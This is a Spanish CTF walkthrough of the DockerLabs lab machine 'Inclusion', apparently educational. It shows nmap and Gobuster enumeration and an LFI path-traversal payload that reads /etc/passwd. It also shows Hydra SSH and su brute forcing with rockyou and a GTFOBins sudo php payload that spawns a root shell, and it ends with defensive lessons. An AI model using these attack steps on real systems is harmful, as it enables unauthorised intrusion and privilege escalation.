# Inclusion — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟡 Medio  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 12/05/2024  
**Técnicas:** LFI · Gobuster · Hydra · SSH · suForce · Password Brute Force · PHP sudo abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
3. [Explotación LFI — lectura de archivos](#3-explotación-lfi--lectura-de-archivos)
4. [Fuerza bruta SSH — Hydra](#4-fuerza-bruta-ssh--hydra)
5. [Acceso SSH y movimiento lateral](#5-acceso-ssh-y-movimiento-lateral)
6. [Escalada de privilegios](#6-escalada-de-privilegios)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh inclusion.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
22/tcp open ssh
80/tcp open http
```

Servicios detectados:

```text
OpenSSH
Apache2 Debian Default Page
```

---

## 2. Enumeración web — Gobuster

Accedemos al servidor web y observamos únicamente la página por defecto de Apache.

Enumeramos directorios:

```bash
gobuster dir -u http://172.17.0.2 \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/shop
/index.html
```

Exploramos el directorio:

```text
http://172.17.0.2/shop
```

Realizamos una nueva enumeración:

```bash
gobuster dir -u http://172.17.0.2/shop \
-w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
-x php,html,py,txt -t 100
```

Resultado:

```text
/index.php
```

---

## 3. Explotación LFI — lectura de archivos

La página muestra un mensaje de error relacionado con PHP:

```text
Error de Sistema: $_GET['archivo']
```

El parámetro parece vulnerable a **Local File Inclusion (LFI)**.

Probamos leer `/etc/passwd`:

```text
http://172.17.0.2/shop/index.php?archivo=../../../../etc/passwd
```

Resultado:

```text
manchi:x:1000:1000::/home/manchi:/bin/bash
seller:x:1001:1001::/home/seller:/bin/bash
```

Obtenemos dos posibles usuarios válidos.

---

## 4. Fuerza bruta SSH — Hydra

Realizamos fuerza bruta SSH contra el usuario `manchi`:

```bash
hydra -l manchi -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: manchi
password: jesus1
```

---

## 5. Acceso SSH y movimiento lateral

Accedemos mediante SSH:

```bash
ssh manchi@172.17.0.2
```

Exploramos usuarios disponibles:

```bash
ls -la /home/
```

Resultado:

```text
manchi
seller
```

No encontramos información útil inicialmente.

Transferimos la herramienta `Linux-Su-Force` desde nuestro host:

```bash
scp Linux-Su-Force.sh manchi@172.17.0.2:/home/manchi
```

También copiamos el diccionario:

```bash
scp rockyou.txt manchi@172.17.0.2:/home/manchi
```

Damos permisos de ejecución:

```bash
chmod +x Linux-Su-Force.sh
```

Ejecutamos fuerza bruta local:

```bash
./Linux-Su-Force.sh seller rockyou.txt
```

Resultado:

```text
Contraseña encontrada para el usuario seller: qwerty
```

Cambiamos al usuario:

```bash
su seller
```

Contraseña:

```text
qwerty
```

Verificamos acceso:

```bash
whoami
seller
```

---

## 6. Escalada de privilegios

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/php
```

Consultamos GTFOBins para `php`.

Payload utilizado:

```bash
CMD="/bin/sh"
sudo /usr/bin/php -r "system('$CMD');"
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Local File Inclusion | Lectura arbitraria de archivos |
| Contraseña débil SSH | Acceso inicial |
| Fuerza bruta local con suForce | Movimiento lateral |
| PHP ejecutable con sudo | Escalada a root |

**Para defenderse:**

- Validar correctamente parámetros de inclusión.
- Aplicar políticas robustas de contraseñas.
- Restringir herramientas de fuerza bruta internas.
- Limitar binarios peligrosos ejecutables mediante sudo.
- Aplicar principio de mínimo privilegio.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
